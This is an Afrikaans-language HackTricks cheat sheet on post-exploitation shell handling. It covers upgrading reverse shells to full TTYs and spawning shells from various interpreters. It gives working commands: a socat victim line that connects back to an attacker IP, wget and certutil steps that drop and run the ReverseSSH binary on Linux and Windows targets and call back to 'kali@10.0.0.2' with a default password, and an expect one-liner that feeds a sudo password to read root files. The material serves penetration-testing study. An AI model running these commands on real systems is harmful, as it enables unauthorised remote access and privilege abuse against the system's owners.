# Volle TTYs

{{#include ../../banners/hacktricks-training.md}}

## Volle TTY

Let op dat die shell wat jy in die `SHELL` veranderlike stel **moet** **in** _**/etc/shells**_ **gelys wees** of `Die waarde vir die SHELL veranderlike is nie in die /etc/shells lêer gevind nie. Hierdie voorval is gerapporteer`. Let ook op dat die volgende snippette slegs in bash werk. As jy in 'n zsh is, verander na 'n bash voordat jy die shell verkry deur `bash` te loop.

#### Python
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'

(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
> [!NOTE]
> Jy kan die **aantal** van **rye** en **kolomme** kry deur **`stty -a`** uit te voer

#### script
```bash
script /dev/null -qc /bin/bash #/dev/null is to not store anything
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
#### socat
```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
### **Spawn shells**

- `python -c 'import pty; pty.spawn("/bin/sh")'`
- `echo os.system('/bin/bash')`
- `/bin/sh -i`
- `script -qc /bin/bash /dev/null`
- `perl -e 'exec "/bin/sh";'`
- perl: `exec "/bin/sh";`
- ruby: `exec "/bin/sh"`
- lua: `os.execute('/bin/sh')`
- IRB: `exec "/bin/sh"`
- vi: `:!bash`
- vi: `:set shell=/bin/bash:shell`
- nmap: `!sh`

## ReverseSSH

'n gerieflike manier vir **interaktiewe skulp toegang**, sowel as **lêer oordragte** en **poort forwarding**, is om die staties-gekoppelde ssh bediener [ReverseSSH](https://github.com/Fahrj/reverse-ssh) op die teiken te plaas.

Hieronder is 'n voorbeeld vir `x86` met upx-gecomprimeerde binêre. Vir ander binêre, kyk na [releases page](https://github.com/Fahrj/reverse-ssh/releases/latest/).

1. Berei plaaslik voor om die ssh poort forwarding versoek te vang:
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -v -l -p 4444
```
- (2a) Linux teiken:
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
```
- (2b) Windows 10 teiken (vir vroeëre weergawes, kyk na [project readme](https://github.com/Fahrj/reverse-ssh#features)):
```bash
# Drop it via your preferred way, e.g.
certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe

reverse-ssh.exe -p 4444 kali@10.0.0.2
```
- As die ReverseSSH poort forwarding versoek suksesvol was, behoort jy nou in staat te wees om in te log met die standaard wagwoord `letmeinbrudipls` in die konteks van die gebruiker wat `reverse-ssh(.exe)` uitvoer:
```bash
# Interactive shell access
ssh -p 8888 127.0.0.1

# Bidirectional file transfer
sftp -P 8888 127.0.0.1
```
## Penelope

[Penelope](https://github.com/brightio/penelope) opgradeer outomaties Linux reverse shells na TTY, hanteer die terminalgrootte, log alles en nog baie meer. Dit bied ook readline-ondersteuning vir Windows shells.

![penelope](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)

## Geen TTY

As jy om een of ander rede nie 'n volle TTY kan verkry nie, kan jy **nog steeds met programme interaksie hê** wat gebruikersinvoer verwag. In die volgende voorbeeld word die wagwoord aan `sudo` gegee om 'n lêer te lees:
```bash
expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
```
{{#include ../../banners/hacktricks-training.md}}
